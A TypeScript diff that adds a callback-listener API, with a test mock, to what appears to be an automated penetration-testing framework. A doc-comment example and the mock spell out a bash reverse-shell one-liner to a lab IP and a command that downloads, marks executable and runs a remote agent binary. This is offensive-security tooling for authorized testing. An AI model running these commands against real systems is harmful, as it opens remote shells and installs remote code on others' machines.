@@ -153,6 +153,26 @@ export interface LlmRunner {
   session?: "persistent" | "fresh";
 }
 
+/** Options for requesting a callback listener via {@link RunContext.callback}. */
+export interface CallbackOpts {
+  /** Listener mode. Default: `"raw"`. */
+  mode?: "agent" | "raw" | "http";
+  /** Specific port to use. `0` or omitted means auto-allocate. */
+  port?: number;
+}
+
+/** Connection info returned by {@link RunContext.callback}. */
+export interface CallbackInfo {
+  /** Routable IP the target should connect to (tun0 or equivalent). */
+  ip: string;
+  /** Port the listener is bound to. */
+  port: number;
+  /** Listener mode. */
+  mode: string;
+  /** Ready-to-use reverse shell one-liner for the target. */
+  oneliner: string;
+}
+
 /**
  * Execution context passed to every {@link Action.run} call. Provides all
  * interaction with the engagement: run commands, emit events, search knowledge,
@@ -257,6 +277,20 @@ export interface RunContext {
 
   /** Log a progress message (visible in the Agent Log UI tab). */
   log(message: string): void;
+
+  /**
+   * Request a callback listener from gleipnir. Opens a listener on the relay
+   * and returns connection info the target can use to connect back.
+   *
+   * @example
+   * ```ts
+   * const cb = await ctx.callback({ mode: "raw" });
+   * // cb.ip = "10.10.14.81", cb.port = 9001
+   * // cb.oneliner = "bash -c 'bash -i >& /dev/tcp/10.10.14.81/9001 0>&1'"
+   * await ctx.exec("curl", [vulnUrl, "-d", cb.oneliner]);
+   * ```
+   */
+  callback(opts?: CallbackOpts): Promise<CallbackInfo>;
 }
 
 /**
@@ -438,6 +472,8 @@ export interface MockContext extends RunContext {
   execCalls: ExecCall[];
   /** The exec results map (mutable, so tests can update mid-run). */
   execResults: MockExecMap;
+  /** Callback requests recorded via {@link RunContext.callback}. */
+  callbackRequests: CallbackOpts[];
 }
 
 /**
@@ -467,6 +503,7 @@ export function createMockContext(opts: MockContextOpts = {}): MockContext {
   const filesRead: string[] = [];
   const execCalls: ExecCall[] = [];
   const execResults: MockExecMap = { ...opts.execResults };
+  const callbackRequests: CallbackOpts[] = [];
   const timeScale = opts.timeScale ?? 0;
 
   const event: EngagementEvent = {
@@ -502,6 +539,7 @@ export function createMockContext(opts: MockContextOpts = {}): MockContext {
     filesRead,
     execCalls,
     execResults,
+    callbackRequests,
 
     async exec(tool, args, execOpts) {
       const call: ExecCall = { tool, args: [...args], opts: execOpts, timestamp: Date.now() };
@@ -560,6 +598,20 @@ export function createMockContext(opts: MockContextOpts = {}): MockContext {
 
     log(message) {
       logs.push(message);
+    },
+
+    async callback(cbOpts) {
+      callbackRequests.push(cbOpts ?? {});
+      const mode = cbOpts?.mode ?? "raw";
+      const port = cbOpts?.port ?? 9001;
+      const ip = "10.10.14.1";
+      let oneliner: string;
+      if (mode === "agent") {
+        oneliner = `curl http://${ip}:6666/api/agents/linux/amd64 -o /tmp/agent && chmod +x /tmp/agent && /tmp/agent -H ${ip} -p ${port}`;
+      } else {
+        oneliner = `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`;
+      }
+      return { ip, port, mode, oneliner };
     },
   };
 }
